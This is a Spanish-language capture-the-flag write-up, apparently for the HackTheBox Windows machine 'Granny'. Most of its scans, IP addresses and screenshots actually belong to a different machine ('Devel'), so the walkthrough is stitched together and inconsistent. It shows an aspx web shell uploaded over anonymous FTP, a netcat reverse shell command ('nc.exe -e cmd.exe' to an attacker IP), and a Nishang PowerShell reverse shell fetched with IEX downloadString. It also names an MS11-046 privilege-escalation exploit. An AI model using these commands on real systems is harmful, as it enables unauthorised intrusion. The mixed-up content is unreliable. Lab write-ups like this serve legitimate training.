---
layout: post
title: "Granny"
subtitle: 'HackTheBox - Easy Machine - Windows'
date: 2020-08-18 12:00:00
author: "TheusZero"
header-img: "images/post/WindowsMachines/Granny/1.png"
catalog: true
comments: true
tags:
  - Windows
  - Machine
  - Explotations
  - Upgrade
  - Shell
  - Root
  - User
---

granny corresponde a una maquina windows de nivel facil tanto en el user como en el root.

muchos usuarios usaron metasploit para esta maquina, sin embargo se intentara explicar de la mejor manera el root de esta misma sin necesidad de usar modulos de metasploit.

## otros write-ups interesantes
[savit4r](https://www.youtube.com/watch?v=1cGg-XtNCa0&list=PLlb2ZjHtNkpiSbrOfeRASNsvpHD6bEWoA&index=6)

[marcelowoloszyn.cl](https://marcelowoloszyn.cl/hackthebox/hack-the-box-write-up-granny/)

## Introduccion

Segun la comunidad podemos ver que Granny tiene un nivel "facil".
![](/TheusZero/images/post/WindowsMachines/Devel/2.png)
![](/TheusZero/images/post/WindowsMachines/Devel/3.png)

## Enumeracion

el nmap que arrojamos fue el siguiente:

```Python
  root@kali:~/hackthebox/granny# nmap -sC -sV -O 10.10.10.15
  Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-21 17:43 EDT
  Nmap scan report for 10.10.10.15
  Host is up (0.14s latency).
  Not shown: 999 filtered ports
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Microsoft IIS httpd 6.0
  | http-methods: 
  |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
  |_http-server-header: Microsoft-IIS/6.0
  |_http-title: Under Construction
  | http-webdav-scan: 
  |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
  |   WebDAV type: Unknown
  |   Server Date: Mon, 21 Oct 2019 21:44:41 GMT
  |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
  |_  Server Type: Microsoft-IIS/6.0
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
  OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 
  cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
  Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft W
  indows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft 
  Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%), Microsof
  t Windows XP SP2 or Windows Server 2003 SP2 (85%)
  No exact OS matches for host (test conditions non-ideal).
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Podemos ver que tenemos un puerto 21 ftp abierto y un puerto 80 con http funcionado, por ende, aondaremos con un -sC -sV en el peurto 21 y el 80 intentando encontrar algun tipo de script que podamos usar.

```Python
root@kali# nmap -sV -sC -p 21,80 -oA scans/nmap-scripts 10.10.10.5
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-21 21:44 EST
Nmap scan report for 10.10.10.5
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

veemos que podemos acceder con **Anonymous** a la red del ftp y tenemos algunos archivos, como **welcome.png y iisstart.htm**

revisando el http 80 obtenemos lo siguiente:
![](/TheusZero/images/post/WindowsMachines/Devel/4.png)

esta imagen corresponde a la misma que se encuentra en el ftp llamada welcome, por ende, podemos intuir que el ftp corresponde a un directorio web que se ejecuta en la maquina, para comprobarlo revisamos el archivo **iisstart.htm**, entonces:

> http://10.10.10.5/iisstart.htm
>> nos deberia mostrar algun tipo de respuesta

Obtenemos esto:

```Python
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 25 Feb 2019 10:40:02 GMT
Connection: close
Content-Length: 689
```
exito, ya tenemos por donde explotar

## obtencion de una shell

windows rara vez tiene netcat o alguna reverse shell de las que tiene pentesteyMonkey por ende, debemos usar algunas diferentes que el sistema suele tener.
Con este comando obtenemos algunas reverse shell con aspx
```Python
root@kali# locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
root@kali# cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
```

> usando la de /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx

entramos al ftp y subimos la shell 
```Python
ftp> put cmd.aspx  
local: cmd.aspx remote: cmd.aspx 
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.                              
1442 bytes sent in 0.00 secs (985.4465 kB/s) 
```

vamos al 80 y revisamos la shell 

> http://10.10.10.5/cmd.aspx

![](/TheusZero/images/post/WindowsMachines/Devel/5.png)

subiremos el binario de netcat ahora para entablar una buena reverse shell

![](/TheusZero/images/post/WindowsMachines/Devel/6.png)

o bien 

```Python
root@kali# locate nc.exe
/opt/SecLists/Web-Shells/FuzzDB/nc.exe
/opt/shells/netcat/nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-binaries/nc.exe
```
ahora lo subiremos a ftp usando BINARY ya que asi la data no se corrompe, recordar utilizar md5

con netcat ya subido, lo buscamos usando recursion sobre el disco C:
![](/TheusZero/images/post/WindowsMachines/Devel/7.png)
```Python
C:/Ruta/nc.exe -e cmd.exe 10.10.14.14 443
```
![](/TheusZero/images/post/WindowsMachines/Devel/devel-shell.gif)
lo ejecutamos y estamos dentro

#### Nishang

> https://github.com/samratashok/nishang

Nishang es un framework de scripts y payloads para windows, especificamente para activar y usar la PowerShell que siempre es mas recomendable que el cmd.

primero hay que clonar en nuestro sistema el nishang

```Python
root@kali:/opt# git clone https://github.com/samratashok/nishang.git
Cloning into 'nishang'...
remote: Enumerating objects: 1660, done.
remote: Total 1660 (delta 0), reused 0 (delta 0), pack-reused 1660
Receiving objects: 100% (1660/1660), 6.62 MiB | 23.70 MiB/s, done.
Resolving deltas: 100% (1040/1040), done.
```

luego hay que copiar **InvokePowerShellTcp.ps1** desde **/opt/nishang/Shells/**.

> escribimos en **InvokePowerShellTcp.ps1** en el final lo siguiente:
>> Invoke-PowerShellTcp -Reverse -IPAddress MiIp -Port 443

lo subimos a la maquina y lo ejecutamos escribriendo el siguiente comando.

> start /b powershell IEX(New-Object Net.WebClient).downloadString('http://MyIpLoco:Puerto/InvokePowerShellTcp.ps1')

> recordar que son 2 sesiones diferentes de netcat. ojito.

listop, ahi tendriamos acceso a una powerShell. **PERO** muchas de las cosas que nos salen podrian ser falsos positivios.

Para evitar esto podemos hacer lo siguiente:
```Python
[Environment]::Is64BitsOperatingSystem //si es true entonces tamos bien
```

```Python
[Environment]::Is64BitsProcess
```
> si es falso, este proceso de shell es de 32bits, por lo que tenemos que migrar a mano a un proceso de 64 bits si o si debemos migrar

```start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://MyIpAdrress:8000/Invoke_PowerShellTCP.ps1')```

> recordar que tenemos que tener una session de netcat en el puerto 443 abierta.

con esto logramos crear una powerShell que trabaje en 64bits, por lo que volvemos a lanzar un netcat para obtener la reverse shell otra vez

> preguntamos otra vez :
>> ```[Environment]::Is64BitsProcess```

una vez que es true podemos continuar y no van a darnos falsos positivos

#### root
con un systeminfo obtenemos la version de la maquina: 
![](/TheusZero/images/post/WindowsMachines/Devel/8.png)
ya con esto podemos dar por entendido que version es, ahora al colocarla en google podemos acceder a un exploit simple de nombre:
> MS11-046 exploit (buscar en github)

subimos el binario que esta disponible y listo, somos root. 


